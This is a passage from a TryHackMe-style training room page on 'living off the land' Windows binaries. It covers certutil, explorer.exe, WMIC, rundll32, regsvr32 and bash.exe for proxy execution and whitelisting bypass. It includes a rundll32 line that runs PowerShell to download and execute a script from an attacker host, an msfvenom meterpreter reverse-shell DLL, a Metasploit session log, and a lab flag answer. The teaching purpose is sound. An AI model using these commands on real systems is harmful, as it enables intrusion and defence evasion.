In order to decode the file, we use&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-decode</span><span style="font-size:1rem">&nbsp;option as follow:</span></p>
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; certutil -decode Encoded_file payload.txt</span></code>
	    </pre></div></div>
<p></p>
<p><b>What is the file content?</b></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********************************}" value="THM{ea4e2b9f362320d098635d4bab8a568e}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> File Execution
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">This task shows various ways of executing a binary within the operating system.&nbsp;The typical case of executing a binary involves various known methods such as using the command line&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">cmd.exe</span><span style="color:rgb(33, 37, 41);font-size:1rem">&nbsp;</span><span>or from the desktop. However, other ways exist to achieve payload execution by abusing other system binaries, of which one of the reasons is to hide or harden the payload's process. Based on the <a class="cOAVNuSE glossary-term" onclick="initPopOver(&#39;MITRE&#39;, &#39;cOAVNuSE&#39;)">MITRE</a> ATT&amp;CK framework, this technique is called&nbsp;</span></span><strong>Signed Binary Proxy Execution</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">&nbsp;or&nbsp;</span><strong>Indirect Command Execution</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">, where the attacker leverages other system tools to spawn malicious payloads. This technique also helps to evade defensive controls.</span><br></p>
<p><span style="font-size:24px">File Explorer</span></p><p><img src="./TryHackMe _ Living Off the Land_files/7f1d844fc2d17f26e1f454e47d3ab937.png" style="float:left;width:143px;height:143px" class="note-float-left" alt=" "></p><p><br></p><p>File Explorer is a file manager and system component for Windows. People found that using the file explorer binary can execute other&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">.exe</span><span style="font-size:1rem">&nbsp;</span>files. This technique is called <b>Indirect Command Execution</b>, where the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">explorer.exe</span><span style="font-size:1rem">&nbsp;tool</span>&nbsp;can be used and abused to launch malicious scripts or executables from a trusted parent process.</p><p><span style="font-size:1rem">The&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">explorer.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">binary is located at:</span><br></p><ul><li>C:\Windows\<span style="color:rgb(0, 0, 0);font-family:sans, sans-serif;font-size:medium">explorer.</span>exe for the Windows 32 bits version</li><li>C:\Windows\SysWOW64\<span style="color:rgb(0, 0, 0);font-family:sans, sans-serif;font-size:medium">explorer.</span>exe for the Windows 64 bits version</li></ul><p>In order to create a child process of&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">explorer.exe</span><span style="font-size:1rem">&nbsp;</span>parent, we can execute the following command:</p>
<p>
</p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; explorer.exe /root,"C:\Windows\System32\calc.exe"</span></code>
	    </pre></div></div><p></p>
<p>As a result of the previous command, we popped the calculator on the desktop.</p>
<p></p><p><span style="font-size:24px">WMIC</span></p><p><span style="font-size:1rem">Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures.&nbsp;</span><span style="color:rgb(14, 16, 26)"><span>The <a class="ee69Ht0n glossary-term" onclick="initPopOver(&#39;MITRE&#39;, &#39;ee69Ht0n&#39;)">MITRE</a> ATT&amp;CK framework</span></span>&nbsp;refers to this technique as Signed Binary Proxy Execution (<a href="https://attack.mitre.org/techniques/T1218/" target="_blank">T1218</a><span style="color:rgb(0, 0, 0);font-family:sans, sans-serif;font-size:medium">)</span></p>

<p>
</p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt;wmic.exe process call create calc
Executing (Win32_Process)-&gt;Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 1740;
        ReturnValue = 0;
};


C:\Users\thm&gt;</span></code>
	    </pre></div></div><p></p>
<p>The previous&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">WMIC</span><span style="font-size:1rem">&nbsp;</span>command creates a new process of a binary of our choice, which in this case <span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">calc.exe</span>.</p>
<p></p>
<p></p><p><span style="font-size:24px">Rundll32</span></p><p><span style="font-size:1rem">Rundll32 is a&nbsp;</span><span style="font-size:1rem">Microsoft</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">built-in tool that loads and runs&nbsp;</span><span style="font-size:1rem">Dynamic Link Library</span><span style="font-size:1rem">&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em"><span><a class="QcARZ0z4 glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;QcARZ0z4&#39;)">DLL</a></span></span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">files within the operating system. A red team can abuse and leverage&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">rundll32.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>to run arbitrary payloads and execute JavaScript and <a class="V8v8xq41 glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;V8v8xq41&#39;)">PowerShell</a> scripts.&nbsp;</span></span><span style="color:rgb(14, 16, 26);font-size:1rem">The MITRE&nbsp;</span><span style="font-size:1rem">ATT&amp;CK framework identifies this as&nbsp;</span><b style="font-size:1rem">Signed Binary Proxy Execution: Rundll32</b><span style="font-size:1rem"> and refers to it as </span><a href="https://attack.mitre.org/techniques/T1218/011/" target="_blank">T1218</a><span style="font-size:1rem">.</span></p><p><img src="./TryHackMe _ Living Off the Land_files/8c486194a27568f2db0fd410cf82dbc6.png" style="float:right;width:146.5px;height:157.366px" class="note-float-right" alt=" "></p><p><span style="font-size:1rem">The&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">rundll32.exe</span><span style="font-size:1rem">&nbsp;binary is located at:</span></p><ul><li>C:\Windows\System32\rundll32.exe for the Windows 32 bits version</li><li>C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version</li></ul><p><span style="font-size:1rem">Now let's try to execute a&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">calc.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">binary as proof of concept using the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">rundll32.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">binary:</span><br></p><p></p>
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");</span></code>
	    </pre></div></div>
<p></p>
<p>In the previous command, we used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">rundll32.exe</span><span style="font-size:1rem">&nbsp;</span>binary that embeds a JavaScript component,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">eval()</span><span style="font-size:1rem">,&nbsp;</span>to execute the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">calc.exe</span><span style="font-size:1rem">&nbsp;</span>binary, a Microsoft calculator.</p><p><span>As we mentioned previously, we can also execute <a class="3d6BxZJU glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;3d6BxZJU&#39;)">PowerShell</a> scripts using the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">rundll32.exe</span><span style="font-size:1rem"><span>. The following command runs a JavaScript that executes a <a class="ER2rIZ3x glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;ER2rIZ3x&#39;)">PowerShell</a> script to download from a remote website using&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">rundll32.exe</span><span style="font-size:1rem">.</span></p>
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");</span></code>
	    </pre></div></div>
<p></p>

<p>As a result of the previous execution, a copy of the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">script.ps1</span><span style="font-size:1rem">&nbsp;</span>downloaded into memory on the target machine.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and practice these tools on the attached machine!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Application Whitelisting Bypasses
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:24px">Bypassing&nbsp;</span><span style="font-size:24px">Application Whitelisting</span><br></p><p>Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time.&nbsp;Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system.&nbsp;<span style="font-size:1rem">This task focuses on LOLBAS examples that are used to bypass the Windows application whitelisting.</span><br></p><p><span style="font-size:24px">Regsvr32</span></p><p>Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)&nbsp; in the Windows Registry.&nbsp;<span style="font-size:1rem">The regsvr.exe binary is located at:</span></p><ul><li>C:\Windows\System32\regsvr32.exe for the Windows 32 bits version</li><li>C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version</li></ul>Besides its intended use,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span><span style="font-size:1rem">&nbsp;</span>binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting. According to&nbsp;<a href="https://redcanary.com/" target="_blank">Red Canary</a>&nbsp;reports, the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span><span style="font-size:1rem">&nbsp;</span>binary is the third most popular <a href="https://attack.mitre.org/techniques/T1218/010/" target="_blank">ATT&amp;CK technique</a>. Adversaries leverage&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span><span style="font-size:1rem">&nbsp;</span>to execute native code or scripts locally or remotely. The technique used in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span><span>&nbsp;uses trusted Windows <a class="2H1FpoJ6 glossary-term" onclick="initPopOver(&#39;OS&#39;, &#39;2H1FpoJ6&#39;)">OS</a> components and is executed in memory, which is one of the reasons why this technique is also used to bypass application whitelisting.&nbsp;</span><p></p><p>Let's try to apply this technique in real life. First, we need to create a malicious&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em"><span><a class="YitgUPb3 glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;YitgUPb3&#39;)">DLL</a></span></span><span style="font-size:1rem">&nbsp;</span>file using msvenom and set up our&nbsp; Metasploit listener to receive a reverse shell. Note that we will be creating a malicious file that works for 32bit operating systems.&nbsp;We will be using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span><span style="font-size:1rem">&nbsp;</span>Application Whitelisting Bypass technique to run a command on a target system.<br></p><p></p><p></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>tun0 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> -f dll -a x86 <span class="token operator">&gt;</span> live0fftheland.dll </span></span>
<span class="token output">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
No encoder specified, outputting raw payload 
Payload size: 375 bytes 
Final size of dll file: 8704 bytes 

</span><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">user@machine$ msfconsole -q </span></span>
<span class="token output"><span>msf6 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp 
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp 
payload =&gt; windows/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) &gt; set LHOST ATTACKBOX_IP
LHOST =&gt; ATTACKBOX_IP
msf6 exploit(multi/handler) &gt; set LPORT 443 
LPORT =&gt; 443 
msf6 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on ATTACKBOX_IP:443 </span></span></code>
	    </pre></div></div><p>Note that we specified the output type as&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em"><span><a class="n4QHktVs glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;n4QHktVs&#39;)">DLL</a></span></span><span style="font-size:1rem">&nbsp;</span>using the<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-f</span><span style="font-size:1rem">&nbsp;</span><span>argument. Once the malicious <a class="IUqA9FpX glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;IUqA9FpX&#39;)">DLL</a> file is generated, we need to deliver the payload to the victim machine. We will do this by using a webserver to serve the DLL file on our attacking machine as follows,</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3 -m http.server <span class="token number">1337</span></span></span></code>
	    </pre></div></div><p>From the victim machine, visit the webserver of the attacking machine on port&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">1337</span><span style="font-size:1rem">&nbsp;</span>that we specify. Note that this port can be changed with your choice!</p><p><span>On the victim machine, once the file <a class="MLV40XFh glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;MLV40XFh&#39;)">DLL</a> file is downloaded, we execute it using&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span>&nbsp;<span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">as follows,</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
or
C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll</span></code>
	    </pre></div></div><p>With the second option, which is a more advanced command, we instruct the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span><span style="font-size:1rem">&nbsp;</span>to run:</p><ul><li><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/s</span>: in silent mode (without showing messages)</li><li><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/n</span><span>: to not call the <a class="eSD1TKfj glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;eSD1TKfj&#39;)">DLL</a> register server</span></li><li><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/i:</span>: to use another server since we used /n</li><li><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/u</span>: to run with unregister method</li></ul><p>On the attacking machine, we should receive a reverse shell.</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output"><span>msf6 &gt; exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on ATTACKBOX_IP:443 
[*] Sending stage (175174 bytes) to 10.10.159.197 
[*] Meterpreter session 1 opened (ATTACKBOX_IP:443 -&gt; 10.10.159.197:52845 ) at 2022-01-20 05:51:31 -0600</span></span></code>
	    </pre></div></div><p>Note if we wanted to create a 64-bit&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em"><span><a class="g9G3PD0T glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;g9G3PD0T&#39;)">DLL</a></span></span>&nbsp;version, we need to specify it in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">msfvenom</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">command and run it from the victim machine using the 64bits version of&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">regsvr32.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">at C:\Windows\SysWOW64\regsvr32.exe.</span></p>

<p></p><p><span style="font-size:24px">Bourne Again Shell (Bash)</span></p><p><span>In 2016, Microsoft added support for the <a class="lXlbNwxN glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;lXlbNwxN&#39;)">Linux</a> environment on Windows 10,11, and Server 2019. This feature is known as Windows Subsystem for Linux (</span><a href="https://docs.microsoft.com/en-us/windows/wsl/about" target="_blank">WSL</a>), and it exists in <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions" target="_blank">two WSL versions</a><span>: WSL1 and WSL2. WSL is a Hyper-V virtualized <a class="MDS4Nf2a glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;MDS4Nf2a&#39;)">Linux</a> distribution that runs on the operating system, supporting a subset of the Linux kernel and system calls. This feature is an addon that a user can install and interact with a Linux distribution. As part of WSL,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bash.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>is a Microsoft tool for interacting with the <a class="ZsLQoygL glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;ZsLQoygL&#39;)">Linux</a> environment.&nbsp;</span></span></p><p><span style="font-size:1rem">People found ways to execute payloads and bypass the Windows application whitelisting since it is a Microsoft signed binary. By executing&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bash.exe -c "path-to-payload"</span><span style="font-size:1rem">, we can execute any unsigned payload. ATT&amp;CK called this an <b>Indirect Command execution</b>&nbsp;</span><span style="font-size:1rem">technique</span><span 